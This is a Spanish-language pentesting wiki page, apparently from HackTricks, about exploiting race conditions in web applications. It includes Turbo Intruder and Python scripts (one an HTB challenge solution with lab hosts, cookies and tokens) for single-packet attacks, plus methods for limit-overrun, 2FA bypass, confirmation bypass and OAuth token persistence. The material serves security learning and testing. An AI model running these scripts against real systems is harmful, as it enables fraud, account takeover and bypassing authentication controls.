# Race Condition

{{#include ../banners/hacktricks-training.md}}

> [!WARNING]
> Para obtener una comprensión profunda de esta técnica consulta el informe original en [https://portswigger.net/research/smashing-the-state-machine](https://portswigger.net/research/smashing-the-state-machine)

## Mejorando los ataques de Race Condition

El principal obstáculo para aprovechar race conditions es asegurarse de que múltiples requests sean procesadas al mismo tiempo, con una diferencia en sus tiempos de procesamiento muy pequeña — idealmente, menos de 1ms.

Aquí puedes encontrar algunas técnicas para sincronizar requests:

#### HTTP/2 Single-Packet Attack vs. HTTP/1.1 Last-Byte Synchronization

- **HTTP/2**: Permite enviar dos requests sobre una única conexión TCP, reduciendo el impacto del jitter de la red. Sin embargo, debido a variaciones del lado del servidor, dos requests pueden no ser suficientes para un exploit de race condition consistente.
- **HTTP/1.1 'Last-Byte Sync'**: Permite pre-enviar la mayor parte de 20-30 requests, reteniendo un pequeño fragmento que luego se envía conjuntamente, logrando la llegada simultánea al servidor.

La preparación para Last-Byte Sync implica:

1. Enviar headers y body data menos el byte final sin cerrar el stream.
2. Pausar 100ms después del envío inicial.
3. Deshabilitar TCP_NODELAY para utilizar Nagle's algorithm y agrupar los frames finales.
4. Hacer ping para calentar la conexión.

El envío posterior de los frames retenidos debería resultar en su llegada en un solo paquete, verificable con Wireshark. Este método no se aplica a static files, que típicamente no están involucrados en ataques RC.

### Adaptándose a la arquitectura del servidor

Entender la arquitectura del objetivo es crucial. Front-end servers pueden enrutar requests de forma diferente, afectando el timing. El connection warming preventivo del lado del servidor, mediante requests inocuos, puede normalizar los tiempos de request.

#### Manejo del bloqueo basado en session

Frameworks como el session handler de PHP serializan los requests por session, lo que puede ocultar vulnerabilidades. Utilizar diferentes session tokens para cada request puede eludir este problema.

#### Superando límites de tasa o recursos

Si el connection warming no es efectivo, provocar intencionadamente retrasos de rate o resource limits en los web servers mediante una avalancha de requests ficticios podría facilitar el single-packet attack al inducir un retraso del lado del servidor favorable a race conditions.

## Ejemplos de ataque

- **Tubo Intruder - HTTP2 single-packet attack (1 endpoint)**: Puedes enviar la request a **Turbo intruder** (`Extensions` -> `Turbo Intruder` -> `Send to Turbo Intruder`), puedes cambiar en la request el valor que quieres brute forcear para **`%s`** como en `csrf=Bn9VQB8OyefIs3ShR2fPESR0FzzulI1d&username=carlos&password=%s` y luego seleccionar el **`examples/race-single-packer-attack.py`** del desplegable:

<figure><img src="../images/image (57).png" alt=""><figcaption></figcaption></figure>

Si vas a **enviar valores diferentes**, podrías modificar el código con este que usa una wordlist desde el clipboard:
```python
passwords = wordlists.clipboard
for password in passwords:
engine.queue(target.req, password, gate='race1')
```
> [!WARNING]
> Si el sitio web no soporta HTTP2 (solo HTTP1.1) usa `Engine.THREADED` o `Engine.BURP` en lugar de `Engine.BURP2`.

- **Tubo Intruder - HTTP2 single-packet attack (Several endpoints)**: En caso de que necesites enviar una request a 1 endpoint y luego varias requests a otros endpoints para desencadenar la RCE, puedes cambiar el script `race-single-packet-attack.py` por algo como:
```python
def queueRequests(target, wordlists):
engine = RequestEngine(endpoint=target.endpoint,
concurrentConnections=1,
engine=Engine.BURP2
)

# Hardcode the second request for the RC
confirmationReq = '''POST /confirm?token[]= HTTP/2
Host: 0a9c00370490e77e837419c4005900d0.web-security-academy.net
Cookie: phpsessionid=MpDEOYRvaNT1OAm0OtAsmLZ91iDfISLU
Content-Length: 0

'''

# For each attempt (20 in total) send 50 confirmation requests.
for attempt in range(20):
currentAttempt = str(attempt)
username = 'aUser' + currentAttempt

# queue a single registration request
engine.queue(target.req, username, gate=currentAttempt)

# queue 50 confirmation requests - note that this will probably sent in two separate packets
for i in range(50):
engine.queue(confirmationReq, gate=currentAttempt)

# send all the queued requests for this attempt
engine.openGate(currentAttempt)
```
- También está disponible en **Repeater** a través de la nueva opción '**Send group in parallel**' en Burp Suite.
- Para **limit-overrun** podrías simplemente añadir la **misma request 50 veces** en el grupo.
- Para **connection warming**, podrías **añadir** al **inicio** del **grupo** algunas **requests** a alguna parte no estática del servidor web.
- Para **delaying** el proceso **entre** procesar **una request y otra** en 2 pasos de substates, podrías **añadir extra requests entre** ambas requests.
- Para un **multi-endpoint** RC podrías empezar a enviar la **request** que **va al hidden state** y luego **50 requests** inmediatamente después que **explotan el hidden state**.

<figure><img src="../images/image (58).png" alt=""><figcaption></figcaption></figure>

- **Automated python script**: El objetivo de este script es cambiar el email de un usuario mientras lo verifica continuamente hasta que el verification token del nuevo email llegue al último email (esto es porque en el código se observó un RC donde era posible modificar un email pero que la verification se enviara al antiguo, porque la variable que indicaba el email ya estaba poblada con el primero).\
Cuando se encuentra la palabra "objetivo" en los emails recibidos sabemos que recibimos el verification token del email cambiado y terminamos el ataque.
```python
# https://portswigger.net/web-security/race-conditions/lab-race-conditions-limit-overrun
# Script from victor to solve a HTB challenge
from h2spacex import H2OnTlsConnection
from time import sleep
from h2spacex import h2_frames
import requests

cookie="session=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6MiwiZXhwIjoxNzEwMzA0MDY1LCJhbnRpQ1NSRlRva2VuIjoiNDJhMDg4NzItNjEwYS00OTY1LTk1NTMtMjJkN2IzYWExODI3In0.I-N93zbVOGZXV_FQQ8hqDMUrGr05G-6IIZkyPwSiiDg"

# change these headers

headersObjetivo= """accept: */*
content-type: application/x-www-form-urlencoded
Cookie: """+cookie+"""
Content-Length: 112
"""

bodyObjetivo = 'email=objetivo%40apexsurvive.htb&username=estes&fullName=test&antiCSRFToken=42a08872-610a-4965-9553-22d7b3aa1827'

headersVerification= """Content-Length: 1
Cookie: """+cookie+"""
"""
CSRF="42a08872-610a-4965-9553-22d7b3aa1827"

host = "94.237.56.46"
puerto =39697


url = "https://"+host+":"+str(puerto)+"/email/"

response = requests.get(url, verify=False)


while "objetivo" not in response.text:

urlDeleteMails = "https://"+host+":"+str(puerto)+"/email/deleteall/"

responseDeleteMails = requests.get(urlDeleteMails, verify=False)
#print(response.text)
# change this host name to new generated one

Headers = { "Cookie" : cookie, "content-type": "application/x-www-form-urlencoded" }
data="email=test%40email.htb&username=estes&fullName=test&antiCSRFToken="+CSRF
urlReset="https://"+host+":"+str(puerto)+"/challenge/api/profile"
responseReset = requests.post(urlReset, data=data, headers=Headers, verify=False)

print(responseReset.status_code)

h2_conn = H2OnTlsConnection(
hostname=host,
port_number=puerto
)

h2_conn.setup_connection()

try_num = 100

stream_ids_list = h2_conn.generate_stream_ids(number_of_streams=try_num)

all_headers_frames = []  # all headers frame + data frames which have not the last byte
all_data_frames = []  # all data frames which contain the last byte


for i in range(0, try_num):
last_data_frame_with_last_byte=''
if i == try_num/2:
header_frames_without_last_byte, last_data_frame_with_last_byte = h2_conn.create_single_packet_http2_post_request_frames(  # noqa: E501
method='POST',
headers_string=headersObjetivo,
scheme='https',
stream_id=stream_ids_list[i],
authority=host,
body=bodyObjetivo,
path='/challenge/api/profile'
)
else:
header_frames_without_last_byte, last_data_frame_with_last_byte = h2_conn.create_single_packet_http2_post_request_frames(
method='GET',
headers_string=headersVerification,
scheme='https',
stream_id=stream_ids_list[i],
authority=host,
body=".",
path='/challenge/api/sendVerification'
)

all_headers_frames.append(header_frames_without_last_byte)
all_data_frames.append(last_data_frame_with_last_byte)


# concatenate all headers bytes
temp_headers_bytes = b''
for h in all_headers_frames:
temp_headers_bytes += bytes(h)

# concatenate all data frames which have last byte
temp_data_bytes = b''
for d in all_data_frames:
temp_data_bytes += bytes(d)

h2_conn.send_bytes(temp_headers_bytes)

# wait some time
sleep(0.1)

# send ping frame to warm up connection
h2_conn.send_ping_frame()

# send remaining data frames
h2_conn.send_bytes(temp_data_bytes)

resp = h2_conn.read_response_from_socket(_timeout=3)
frame_parser = h2_frames.FrameParser(h2_connection=h2_conn)
frame_parser.add_frames(resp)
frame_parser.show_response_of_sent_requests()

print('---')

sleep(3)
h2_conn.close_connection()

response = requests.get(url, verify=False)
```
### Mejorando Single Packet Attack

En la investigación original se explica que este ataque tiene un límite de 1,500 bytes. Sin embargo, en [**this post**](https://flatt.tech/research/posts/beyond-the-limit-expanding-single-packet-race-condition-with-first-sequence-sync/), se explicó cómo es posible extender la limitación de 1,500 bytes del single packet attack hasta la **limitación de ventana de 65,535 B de TCP usando fragmentación a nivel IP** (dividiendo un único paquete en múltiples paquetes IP) y enviándolos en distinto orden, lo que permite evitar la reensamblación del paquete hasta que todos los fragmentos hayan llegado al servidor. Esta técnica permitió al investigador enviar 10,000 requests en unos 166 ms.

Ten en cuenta que, aunque esta mejora hace el ataque más fiable en RC que requiere cientos/miles de paquetes que lleguen al mismo tiempo, también puede tener algunas limitaciones de software. Algunos servidores HTTP populares como Apache, Nginx y Go tienen un ajuste estricto `SETTINGS_MAX_CONCURRENT_STREAMS` a 100, 128 y 250. Sin embargo, otros como NodeJS y nghttp2 lo tienen ilimitado.\
Esto básicamente significa que Apache solo considerará 100 conexiones HTTP desde una única conexión TCP (limitando este ataque RC).

Puedes encontrar algunos ejemplos usando esta técnica en el repo [https://github.com/Ry0taK/first-sequence-sync/tree/main](https://github.com/Ry0taK/first-sequence-sync/tree/main).

## Raw BF

Antes de la investigación anterior, estos eran algunos payloads usados que simplemente intentaban enviar los paquetes lo más rápido posible para provocar un RC.

- **Repeater:** Revisa los ejemplos de la sección anterior.
- **Intruder:** Envía la **request** a **Intruder**, establece el **number of threads** a **30** dentro del **Options menu**, selecciona como payload **Null payloads** y genera **30**.
- **Turbo Intruder**
```python
def queueRequests(target, wordlists):
engine = RequestEngine(endpoint=target.endpoint,
concurrentConnections=5,
requestsPerConnection=1,
pipeline=False
)
a = ['Session=<session_id_1>','Session=<session_id_2>','Session=<session_id_3>']
for i in range(len(a)):
engine.queue(target.req,a[i], gate='race1')
# open TCP connections and send partial requests
engine.start(timeout=10)
engine.openGate('race1')
engine.complete(timeout=60)

def handleResponse(req, interesting):
table.add(req)
```
- **Python - asyncio**
```python
import asyncio
import httpx

async def use_code(client):
resp = await client.post(f'http://victim.com', cookies={"session": "asdasdasd"}, data={"code": "123123123"})
return resp.text

async def main():
async with httpx.AsyncClient() as client:
tasks = []
for _ in range(20): #20 times
tasks.append(asyncio.ensure_future(use_code(client)))

# Get responses
results = await asyncio.gather(*tasks, return_exceptions=True)

# Print results
for r in results:
print(r)

# Async2sync sleep
await asyncio.sleep(0.5)
print(results)

asyncio.run(main())
```
## **RC Metodología**

### Limit-overrun / TOCTOU

Este es el tipo más básico de race condition donde **vulnerabilidades** que **aparecen** en lugares que **limitan el número de veces que puedes realizar una acción**. Como usar el mismo código de descuento varias veces en una tienda web. Un ejemplo muy fácil se puede encontrar en [**this report**](https://medium.com/@pravinponnusamy/race-condition-vulnerability-found-in-bug-bounty-program-573260454c43) o en [**this bug**](https://hackerone.com/reports/759247)**.**

Hay muchas variantes de este tipo de ataque, incluyendo:

- Canjear una tarjeta de regalo varias veces
- Valorar un producto múltiples veces
- Retirar o transferir dinero por encima del saldo de tu cuenta
- Reutilizar la solución de un mismo CAPTCHA
- Evadir un anti-brute-force rate limit

### **Subestados ocultos**

Explotar race conditions complejas suele implicar aprovechar oportunidades breves para interactuar con subestados de máquina ocultos o **no intencionados**. Aquí tienes cómo abordarlo:

1. **Identificar Subestados Ocultos Potenciales**
- Empieza por localizar endpoints que modifiquen o interactúen con datos críticos, como perfiles de usuario o procesos de restablecimiento de contraseña. Enfócate en:
- **Almacenamiento**: Prefiere endpoints que manipulen datos persistentes en server-side por encima de aquellos que manejan datos en client-side.
- **Acción**: Busca operaciones que alteren datos existentes, que son más propensas a crear condiciones explotables en comparación con las que añaden datos nuevos.
- **Keying**: Los ataques exitosos suelen implicar operaciones indexadas por el mismo identificador, por ejemplo username o reset token.
2. **Realizar sondeos iniciales**
- Prueba los endpoints identificados con ataques de race condition, observando cualquier desviación de los resultados esperados. Respuestas inesperadas o cambios en el comportamiento de la aplicación pueden señalar una vulnerabilidad.
3. **Demostrar la Vulnerabilidad**
- Reduce el ataque al número mínimo de requests necesarios para explotar la vulnerabilidad, a menudo solo dos. Este paso puede requerir múltiples intentos o automatización debido al timing preciso involucrado.

### Ataques sensibles al tiempo

La precisión en el timing de las requests puede revelar vulnerabilidades, especialmente cuando se usan métodos predecibles como timestamps para tokens de seguridad. Por ejemplo, generar password reset tokens basados en timestamps podría permitir tokens idénticos para requests simultáneas.

**Para explotar:**

- Usa un timing preciso, como un ataque de un solo packet, para hacer solicitudes concurrentes de password reset. Tokens idénticos indican una vulnerabilidad.

**Ejemplo:**

- Solicita dos password reset tokens al mismo tiempo y compáralos. Tokens que coinciden sugieren un fallo en la generación de tokens.

Consulta este [**PortSwigger Lab**](https://portswigger.net/web-security/race-conditions/lab-race-conditions-exploiting-time-sensitive-vulnerabilities) para probar esto.

## Estudios de caso de subestados ocultos

### Pagar y añadir un artículo

Consulta este [**PortSwigger Lab**](https://portswigger.net/web-security/logic-flaws/examples/lab-logic-flaws-insufficient-workflow-validation) para ver cómo **pagar** en una tienda y **añadir un artículo extra** que **no tendrás que pagar**.

### Confirmar otros emails

La idea es **verificar una dirección de email y cambiarla por otra al mismo tiempo** para comprobar si la plataforma verifica la nueva que se cambió.

### Cambiar email a 2 direcciones basado en cookies

Según [**this research**](https://portswigger.net/research/smashing-the-state-machine) Gitlab fue vulnerable a un takeover de esta manera porque podría **send** el **email verification token de un email al otro email**.

Consulta este [**PortSwigger Lab**](https://portswigger.net/web-security/race-conditions/lab-race-conditions-single-endpoint) para probar esto.

### Estados ocultos de la base de datos / Confirmation Bypass

Si **2 different writes** se usan para **añadir** **información** dentro de una **base de datos**, hay una pequeña porción de tiempo donde **solo los primeros datos han sido escritos** dentro de la base de datos. Por ejemplo, al crear un usuario el **username** y **password** podrían ser **escritos** y **luego el token** para confirmar la cuenta recién creada es escrito. Esto significa que por un pequeño tiempo el **token para confirmar una cuenta es null**.

Por lo tanto **registrar una cuenta y enviar varias requests con un token vacío** (`token=` or `token[]=` or any other variation) para confirmar la cuenta de inmediato podría permitir **confirmar una cuenta** donde no controlas el email.

Consulta este [**PortSwigger Lab**](https://portswigger.net/web-security/race-conditions/lab-race-conditions-partial-construction) para probar esto.

### Bypass 2FA

The following pseudo-code is vulnerable to race condition because in a very small time the **2FA is not enforced** while the session is created:
```python
session['userid'] = user.userid
if user.mfa_enabled:
session['enforce_mfa'] = True
# generate and send MFA code to user
# redirect browser to MFA code entry form
```
### OAuth2 persistencia eterna

There are several [**OAUth providers**](https://en.wikipedia.org/wiki/List_of_OAuth_providers). Estos servicios te permitirán crear una aplicación y autenticar usuarios que el proveedor ha registrado. Para ello, el **cliente** necesitará **permitir que tu aplicación** acceda a parte de sus datos dentro del **OAUth provider**.\
Hasta aquí es solo un login común con google/linkedin/github... donde se te muestra una página que dice: "_La aplicación \<InsertCoolName> quiere acceder a tu información, ¿quieres permitirlo?_"

#### Race Condition in `authorization_code`

El **problema** aparece cuando **lo aceptas** y automáticamente se envía un **`authorization_code`** a la aplicación maliciosa. Entonces, esta **aplicación abusa de una Race Condition en el proveedor de servicio OAUth para generar más de un AT/RT** (_Authentication Token/Refresh Token_) a partir del **`authorization_code`** de tu cuenta. Básicamente, aprovechará que has aceptado que la aplicación acceda a tus datos para **crear varias cuentas**. Luego, si **dejas de permitir que la aplicación acceda a tus datos, un par de AT/RT será eliminado, pero los otros seguirán siendo válidos**.

#### Race Condition in `Refresh Token`

Una vez que hayas **obtenido un RT válido** podrías intentar **abusarlo para generar varios AT/RT** y **aun si el usuario cancela los permisos** para que la aplicación maliciosa acceda a sus datos, **varios RT seguirán siendo válidos.**

## **RC in WebSockets**

- En [**WS_RaceCondition_PoC**](https://github.com/redrays-io/WS_RaceCondition_PoC) puedes encontrar un PoC en Java para enviar mensajes websocket en **paralelo** y abusar de **Race Conditions** también en Web Sockets.
- Con WebSocket Turbo Intruder de Burp puedes usar el motor **THREADED** para crear múltiples conexiones WS y disparar payloads en paralelo. Parte del ejemplo oficial y ajusta `config()` (número de hilos) para la concurrencia; esto suele ser más fiable que agrupar en una única conexión cuando se compite por el estado del lado servidor entre handlers WS. Ver [RaceConditionExample.py](https://github.com/d0ge/WebSocketTurboIntruder/blob/main/src/main/resources/examples/RaceConditionExample.py).

## References

- [https://hackerone.com/reports/759247](https://hackerone.com/reports/759247)
- [https://pandaonair.com/2020/06/11/race-conditions-exploring-the-possibilities.html](https://pandaonair.com/2020/06/11/race-conditions-exploring-the-possibilities.html)
- [https://hackerone.com/reports/55140](https://hackerone.com/reports/55140)
- [https://portswigger.net/research/smashing-the-state-machine](https://portswigger.net/research/smashing-the-state-machine)
- [https://portswigger.net/web-security/race-conditions](https://portswigger.net/web-security/race-conditions)
- [https://flatt.tech/research/posts/beyond-the-limit-expanding-single-packet-race-condition-with-first-sequence-sync/](https://flatt.tech/research/posts/beyond-the-limit-expanding-single-packet-race-condition-with-first-sequence-sync/)
- [WebSocket Turbo Intruder: Unearthing the WebSocket Goldmine](https://portswigger.net/research/websocket-turbo-intruder-unearthing-the-websocket-goldmine)
- [WebSocketTurboIntruder – GitHub](https://github.com/d0ge/WebSocketTurboIntruder)
- [RaceConditionExample.py](https://github.com/d0ge/WebSocketTurboIntruder/blob/main/src/main/resources/examples/RaceConditionExample.py)

{{#include ../banners/hacktricks-training.md}}
